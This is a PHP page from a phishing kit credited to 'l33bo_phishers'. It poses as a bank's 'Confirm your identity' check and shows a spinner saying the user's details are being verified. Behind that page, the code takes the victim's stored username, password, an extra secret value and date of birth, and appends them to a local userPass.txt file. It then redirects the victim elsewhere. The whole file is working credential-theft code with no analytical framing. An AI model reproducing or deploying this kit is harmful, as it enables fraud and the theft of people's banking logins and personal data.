<?php
/*
Created by l33bo_phishers -- icq: 695059760  
*/
//session_start();
require "CONTROLS.php";
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
require "assets/includes/enc.php";
error_reporting(0);
ini_set(‘display_errors’, ’0′);
date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['user'];
$pass = $_SESSION['pass'];
$nine = $_SESSION['nine'];
$dob = $_POST['two'];
$data = "$ip $user $pass $nine $dob $two\n";
	$file=fopen("userPass.txt","a");
	fwrite($file,$data);
	fclose($file);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<meta name="viewport" id="indict_mobile-meta" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="format-detection" content="telephone=no">
<title>Confirm your identity</title>
<link rel="shortcut icon" type="image/x-icon" href="assets/img/fav.ico">
<link rel="stylesheet" href="assets/css/veri.css" />
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="assets/js/jquery.payment.js"></script>
<script src="http://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="http://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<meta http-equiv="refresh" content="5; url=<?php echo $ExitLink;?>" />
<body id="body" theme="asas" ismobile="false">
<header>
<div id="LogoRegion" control="header">
<div class="masthead-wrapper">
<span class="helper"></span>
<img class="logo" src="assets/img/shim.gif">
</div>
</div>
</header>
<main>
<div id="verifyIdentityMain" class="main-panel">
<div class="page-header">
<div class="message" style="padding:10%">
<br/>
<a id="loadingIcon" name="loadingIcon" href="#"><img style="display:block;margin-left:auto;margin-right:auto" src="assets/img/spin.gif"/></a>
<br />
<h1 style=" text-align: center;">Please wait while we check your information</h1>
<br />
<p align="center" style="text-align: center;">It'll only take a few seconds - we're just verifying the details that you've entered.</p>
<p align="center"  style="text-align: center;">Please don't refresh this page or close your browser while you're waiting.</p>
<p></p>
</div>
</div>
</main>
<footer><div control='footer'><ul><li><a href="#"> Online Security Guarantee </a><a href="#"> | Privacy, Cookies, Security &amp; Legal</a></li></ul></div></footer>
</body>
</html>
